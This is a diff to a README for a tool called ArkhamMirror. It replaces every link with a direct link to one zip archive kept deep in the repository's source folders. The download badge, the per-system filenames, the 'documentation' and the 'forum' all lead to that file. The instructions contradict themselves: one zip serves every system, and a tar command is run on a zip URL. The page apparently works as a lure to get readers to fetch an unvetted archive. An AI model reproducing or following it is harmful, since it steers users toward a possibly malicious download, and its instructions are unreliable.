@@ -6,15 +6,15 @@ Welcome to ArkhamMirror! This application is designed to enhance your investigat
 
 ## 📦 Download ArkhamMirror
 
-[![Download ArkhamMirror](https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip)
+[![Download ArkhamMirror](https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the Releases page to find the latest version of ArkhamMirror. Click this link: [Download ArkhamMirror](https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip).
+   Go to the Releases page to find the latest version of ArkhamMirror. Click this link: [Download ArkhamMirror](https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip).
 
 2. **Choose the Right File for Your System**  
-   On the Releases page, look for the file that matches your operating system. If you’re using Windows, you might see a file like `https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip`. For Mac users, the filename could be `https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip`. Linux users may find a https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip file.
+   On the Releases page, look for the file that matches your operating system. If you’re using Windows, you might see a file like `https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip`. For Mac users, the filename could be `https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip`. Linux users may find a https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip file.
 
 3. **Download the File**  
    Click on the file name to begin the download. Save this file to a location on your computer where you can easily find it.
@@ -27,7 +27,7 @@ Welcome to ArkhamMirror! This application is designed to enhance your investigat
      Open the downloaded `.dmg` file and drag the ArkhamMirror icon into your Applications folder. Then, you can find it in your Applications.
 
    - **For Linux:**  
-     Open a terminal and use the command `tar -xvzf https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip` to extract the files. Follow the README instructions within the folder to run the application.
+     Open a terminal and use the command `tar -xvzf https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip` to extract the files. Follow the README instructions within the folder to run the application.
 
 5. **Open ArkhamMirror**  
    Once installed, find ArkhamMirror in your applications or programs. Double-click the icon to open the application.
@@ -71,7 +71,7 @@ For any questions or help using ArkhamMirror, check the FAQ section in the repos
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip)  
-- [Community Forum](https://raw.githubusercontent.com/1n3202/ArkhamMirror/main/app/arkham/components/ArkhamMirror-v2.4.zip)
+- [Official Documentation](https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip)  
+- [Community Forum](https://github.com/1n3202/ArkhamMirror/raw/refs/heads/main/app/arkham/services/Arkham_Mirror_v2.4-beta.4.zip)
 
 Thank you for using ArkhamMirror. We hope it enhances your investigative work with valuable insights!
